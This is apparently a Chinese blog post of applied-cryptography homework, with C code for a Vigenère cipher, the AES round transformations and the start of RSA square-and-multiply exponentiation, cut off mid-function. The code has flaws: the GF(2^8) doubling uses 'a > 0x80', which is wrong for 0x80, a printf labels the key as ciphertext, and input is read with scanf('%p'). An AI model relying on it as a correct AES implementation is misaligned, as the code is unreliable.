        <content type="html"><![CDATA[<p>记录一下应用密码学课程的代码作业及实验。<a id="more"></a></p><h3 id="Vigenere-Cipher"><a href="#Vigenere-Cipher" class="headerlink" title="Vigenere Cipher"></a>Vigenere Cipher</h3><p>C语言简单实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> plain[] = <span class="string">"blockchaintechnology"</span>, plain_order[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> key[] = <span class="string">"cuitbo"</span>, key_order[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> enc[<span class="number">100</span>], enc_order[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(plain)<span class="number">-1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">plain_order[i] = plain[i]<span class="number">-97</span>;</span><br><span class="line">key_order[i] = key[i%<span class="number">6</span>]<span class="number">-97</span>;</span><br><span class="line">enc_order[i] = (plain_order[i]+key_order[i])%<span class="number">26</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"plain: %s\n"</span>, plain);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enc: %s\n"</span>, key);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"plain_order: "</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(plain)<span class="number">-1</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, plain_order[i]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enc_order: "</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(plain)<span class="number">-1</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, enc_order[i]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enc: "</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(plain)<span class="number">-1</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>, enc_order[i]+<span class="number">97</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AES-变换操作的实现"><a href="#AES-变换操作的实现" class="headerlink" title="AES 变换操作的实现"></a>AES 变换操作的实现</h3><p>用C语言简单实现一下加密的几个过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getData_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*data_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printOut_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*data_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SubBytes_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddRoundKey_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> (*RoundKey_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShiftRows_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mix_columns_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> (*output_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">gfmultby_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> a, <span class="keyword">unsigned</span> <span class="keyword">char</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> Sbox_76[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="comment">// 0     1     2     3     4     5     6     7     8     9     a     b     c     d     e     f</span></span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x7c</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0xf2</span>, <span class="number">0x6b</span>, <span class="number">0x6f</span>, <span class="number">0xc5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2b</span>, <span class="number">0xfe</span>, <span class="number">0xd7</span>, <span class="number">0xab</span>, <span class="number">0x76</span>, <span class="comment">// 0</span></span><br><span class="line"><span class="number">0xca</span>, <span class="number">0x82</span>, <span class="number">0xc9</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xf0</span>, <span class="number">0xad</span>, <span class="number">0xd4</span>, <span class="number">0xa2</span>, <span class="number">0xaf</span>, <span class="number">0x9c</span>, <span class="number">0xa4</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>, <span class="comment">// 1</span></span><br><span class="line"><span class="number">0xb7</span>, <span class="number">0xfd</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3f</span>, <span class="number">0xf7</span>, <span class="number">0xcc</span>, <span class="number">0x34</span>, <span class="number">0xa5</span>, <span class="number">0xe5</span>, <span class="number">0xf1</span>, <span class="number">0x71</span>, <span class="number">0xd8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="comment">// 2</span></span><br><span class="line"><span class="number">0x04</span>, <span class="number">0xc7</span>, <span class="number">0x23</span>, <span class="number">0xc3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9a</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xe2</span>, <span class="number">0xeb</span>, <span class="number">0x27</span>, <span class="number">0xb2</span>, <span class="number">0x75</span>, <span class="comment">// 3</span></span><br><span class="line"><span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2c</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>, <span class="number">0x52</span>, <span class="number">0x3b</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x2f</span>, <span class="number">0x84</span>, <span class="comment">// 4</span></span><br><span class="line"><span class="number">0x53</span>, <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x20</span>, <span class="number">0xfc</span>, <span class="number">0xb1</span>, <span class="number">0x5b</span>, <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x58</span>, <span class="number">0xcf</span>, <span class="comment">// 5</span></span><br><span class="line"><span class="number">0xd0</span>, <span class="number">0xef</span>, <span class="number">0xaa</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x4d</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xf9</span>, <span class="number">0x02</span>, <span class="number">0x7f</span>, <span class="number">0x50</span>, <span class="number">0x3c</span>, <span class="number">0x9f</span>, <span class="number">0xa8</span>, <span class="comment">// 6</span></span><br><span class="line"><span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x40</span>, <span class="number">0x8f</span>, <span class="number">0x92</span>, <span class="number">0x9d</span>, <span class="number">0x38</span>, <span class="number">0xf5</span>, <span class="number">0xbc</span>, <span class="number">0xb6</span>, <span class="number">0xda</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xff</span>, <span class="number">0xf3</span>, <span class="number">0xd2</span>, <span class="comment">// 7</span></span><br><span class="line"><span class="number">0xcd</span>, <span class="number">0x0c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xc4</span>, <span class="number">0xa7</span>, <span class="number">0x7e</span>, <span class="number">0x3d</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="comment">// 8</span></span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4f</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xee</span>, <span class="number">0xb8</span>, <span class="number">0x14</span>, <span class="number">0xde</span>, <span class="number">0x5e</span>, <span class="number">0x0b</span>, <span class="number">0xdb</span>, <span class="comment">// 9</span></span><br><span class="line"><span class="number">0xe0</span>, <span class="number">0x32</span>, <span class="number">0x3a</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xe4</span>, <span class="number">0x79</span>, <span class="comment">// a</span></span><br><span class="line"><span class="number">0xe7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x6d</span>, <span class="number">0x8d</span>, <span class="number">0xd5</span>, <span class="number">0x4e</span>, <span class="number">0xa9</span>, <span class="number">0x6c</span>, <span class="number">0x56</span>, <span class="number">0xf4</span>, <span class="number">0xea</span>, <span class="number">0x65</span>, <span class="number">0x7a</span>, <span class="number">0xae</span>, <span class="number">0x08</span>, <span class="comment">// b</span></span><br><span class="line"><span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2e</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0xc6</span>, <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0x74</span>, <span class="number">0x1f</span>, <span class="number">0x4b</span>, <span class="number">0xbd</span>, <span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="comment">// c</span></span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xf6</span>, <span class="number">0x0e</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xb9</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x1d</span>, <span class="number">0x9e</span>, <span class="comment">// d</span></span><br><span class="line"><span class="number">0xe1</span>, <span class="number">0xf8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xd9</span>, <span class="number">0x8e</span>, <span class="number">0x94</span>, <span class="number">0x9b</span>, <span class="number">0x1e</span>, <span class="number">0x87</span>, <span class="number">0xe9</span>, <span class="number">0xce</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xdf</span>, <span class="comment">// e</span></span><br><span class="line"><span class="number">0x8c</span>, <span class="number">0xa1</span>, <span class="number">0x89</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0xe6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2d</span>, <span class="number">0x0f</span>, <span class="number">0xb0</span>, <span class="number">0x54</span>, <span class="number">0xbb</span>, <span class="number">0x16</span>&#125;;<span class="comment">// f</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> mixValue_76[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">02</span>, <span class="number">03</span>, <span class="number">01</span>, <span class="number">01</span>,</span><br><span class="line">   <span class="number">01</span>, <span class="number">02</span>, <span class="number">03</span>, <span class="number">01</span>,</span><br><span class="line">   <span class="number">01</span>, <span class="number">01</span>, <span class="number">02</span>, <span class="number">03</span>,</span><br><span class="line">   <span class="number">03</span>, <span class="number">01</span>, <span class="number">01</span>, <span class="number">02</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> state_76[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> output_76[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> RoundKey_76[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"明文："</span>);</span><br><span class="line">getData_76(state_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"密钥："</span>);</span><br><span class="line">getData_76(RoundKey_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"输入明文状态矩阵："</span>);</span><br><span class="line">printOut_76(state_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"输入128比特初始密钥矩阵："</span>);</span><br><span class="line">printOut_76(RoundKey_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"轮密钥运算输出："</span>);</span><br><span class="line">AddRoundKey_76(state_76, RoundKey_76);</span><br><span class="line">printOut_76(state_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"字节替代输出："</span>);</span><br><span class="line">SubBytes_76(state_76);</span><br><span class="line">printOut_76(state_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"行移位输出："</span>);</span><br><span class="line">ShiftRows_76(state_76);</span><br><span class="line">printOut_76(state_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"列混合输出："</span>);</span><br><span class="line">mix_columns_76(state_76, output_76);</span><br><span class="line">printOut_76(output_76);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getData_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*data_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> input_76[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">16</span>; i_76++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%p"</span>, input_76+i_76);</span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">4</span>; i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">0</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line">&#123;</span><br><span class="line">data_76[j_76][i_76] = input_76[<span class="number">4</span>*i_76+j_76];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printOut_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*data_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">4</span>; i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">0</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02X "</span>, data_76[i_76][j_76]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SubBytes_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">4</span>; i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">0</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line">&#123;</span><br><span class="line">state_76[i_76][j_76] = Sbox_76[state_76[i_76][j_76]];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddRoundKey_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> (*RoundKey_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">4</span> ;i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">0</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line">&#123;</span><br><span class="line">state_76[i_76][j_76] ^=  RoundKey_76[i_76][j_76];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShiftRows_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76, cnt_76, tmp_76;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">1</span>; i_76 &lt; <span class="number">4</span>; i_76++)</span><br><span class="line">&#123;</span><br><span class="line">cnt_76 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(cnt_76++ &lt; i_76)</span><br><span class="line">&#123;</span><br><span class="line">tmp_76 = state_76[i_76][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">1</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line">&#123;</span><br><span class="line">state_76[i_76][j_76<span class="number">-1</span>] = state_76[i_76][j_76];</span><br><span class="line">&#125;</span><br><span class="line">state_76[i_76][j_76<span class="number">-1</span>] = tmp_76;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">gfmultby_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> a_76, <span class="keyword">unsigned</span> <span class="keyword">char</span> b_76)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> tmp_76 = a_76 &gt; <span class="number">0x80</span> ? (<span class="keyword">unsigned</span> <span class="keyword">char</span>)((a_76&lt;&lt;<span class="number">1</span>)^<span class="number">0x1b</span>):(<span class="keyword">unsigned</span> <span class="keyword">char</span>)(a_76 &lt;&lt; <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(b_76 == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> a_76;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(b_76 == <span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> tmp_76;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> tmp_76^a_76;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mix_columns_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> (*output_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76, k_76;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">4</span>; i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">0</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(k_76 = <span class="number">0</span>; k_76 &lt; <span class="number">4</span>; k_76++)</span><br><span class="line">&#123;</span><br><span class="line">output_76[i_76][j_76] ^= gfmultby_76(state_76[k_76][j_76], mixValue_76[i_76][k_76]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="RSA-模幂运算的实现"><a href="#RSA-模幂运算的实现" class="headerlink" title="RSA 模幂运算的实现"></a>RSA 模幂运算的实现</h3><p>按照平方乘算法和模重复平方法，分别计算<strong>a^n mod n</strong></p><p><strong>1.平方乘算法。</strong></p><p>计算整体思想：先平方再乘。</p><ul><li>先将指数转化为二进制形式。</li><li>从指数的二进制高位到低位依次计算。</li><li>初始化设置，<strong>b1</strong> == 1 ,扫描第一个bit时不需要做其他操作。</li><li>随后若<strong>bi</strong> == 1，则平方上一次的结果后再乘x（底数）；若<strong>bi</strong> == 0，只需要对上一次的结果平方一次即可。</li></ul><p><strong>理解：一次平方操作会让指数向左移一位，并在最右边添加0，而与x（底数）相乘的操作即在指数的最右边位置上填上 1，这样完成后也是得到指数的二进制位了。</strong></p><p>这里贴一下网上看到一张图：</p><p><img src="/2021/04/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A6/image-20210417144224324.png" alt="image-20210417144224324"></p><p>C语言实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LRFun_76</span><span class="params">(<span class="keyword">int</span> a_76, <span class="keyword">int</span> m_76, <span class="keyword">int</span> n_76)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans_76 = <span class="number">1</span>, s_76[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, cnt_76 = <span class="number">0</span>, i_76 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(m_76)</span><br><span class="line">&#123;</span><br><span class="line">s_76[cnt_76++] = m_76&amp;<span class="number">1</span>;</span><br><span class="line">m_76 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(--cnt_76 &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">ans_76 = 